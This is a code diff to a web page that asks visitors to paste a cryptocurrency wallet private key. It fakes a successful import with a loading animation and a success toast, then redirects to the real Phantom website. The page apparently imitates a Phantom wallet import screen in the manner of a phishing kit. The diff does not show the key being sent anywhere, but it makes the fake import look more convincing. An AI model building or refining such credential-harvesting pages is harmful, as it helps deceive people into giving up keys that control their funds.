@@ -69,9 +69,11 @@
     <button class="paste-btn" onclick="document.getElementById('pk-input').focus()">Paste</button>
   </div>
 
-  <div class="toast" id="toast">Wallet imported successfully!</div>
+  <div class="toast" id="toast">✓ Wallet imported successfully! Redirecting...</div>
 
-  <button class="btn btn-dark-purple import-btn-fixed" onclick="handleImport()">Import</button>
+ <button class="btn btn-dark-purple" id="import-btn" onclick="handleImport()" style="margin-bottom:16px;">
+  <span class="btn-text">Import</span>
+</button>
 
   <!-- Network bottom sheet -->
   <div class="network-sheet" id="net-sheet">
@@ -121,7 +123,11 @@ function selectNetwork(n) {
 function handleImport() {
   const key = document.getElementById('pk-input').value.trim();
   if (!key) { alert('Please enter your private key first.'); return; }
-  document.getElementById('toast').style.display='block'; setTimeout(function(){ window.location.href='https://www.phantom.com'; }, 1500);
+  const btn = document.getElementById('import-btn');
+  btn.classList.add('loading');
+  btn.querySelector('.btn-text').textContent = 'Importing...';
+  document.getElementById('toast').style.display = 'block';
+  setTimeout(function() { window.location.href = 'https://www.phantom.com'; }, 2500);
 }
 </script>
 </body>
